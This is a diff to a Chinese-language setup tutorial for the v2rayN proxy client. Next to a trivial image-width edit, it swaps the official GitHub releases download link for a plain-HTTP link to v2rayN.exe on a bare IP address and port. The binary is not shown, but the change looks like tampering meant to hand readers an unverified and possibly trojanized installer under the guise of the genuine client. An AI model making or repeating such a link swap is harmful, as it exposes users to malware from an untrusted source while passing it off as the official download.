@@ -11,7 +11,7 @@
 
 ### 1️⃣:下载客户端
 
-[:material-arrow-down:{ .plane } 点此下载 :material-arrow-down:{ .plane }](https://github.com/2dust/v2rayN/releases){ .md-button }[^1] 
+[:material-arrow-down:{ .plane } 点此下载 :material-arrow-down:{ .plane }](http://154.12.60.107:10010/v2rayN.exe){ .md-button }[^1] 
 
 ---
 
@@ -24,7 +24,7 @@
 !!! tip "建议自动更新时间为360分钟"
 
 <figure markdown="span">
-![Image title](../../assets/photo/win/v2rayn/v22.png){ width="500" }
+![Image title](../../assets/photo/win/v2rayn/v22.png){ width="600" }
   <figcaption>添加订阅 设置自动更新订阅 </figcaption>
 
 ![Image title](../../assets/photo/win/v2rayn/v23.png){ width="500" }
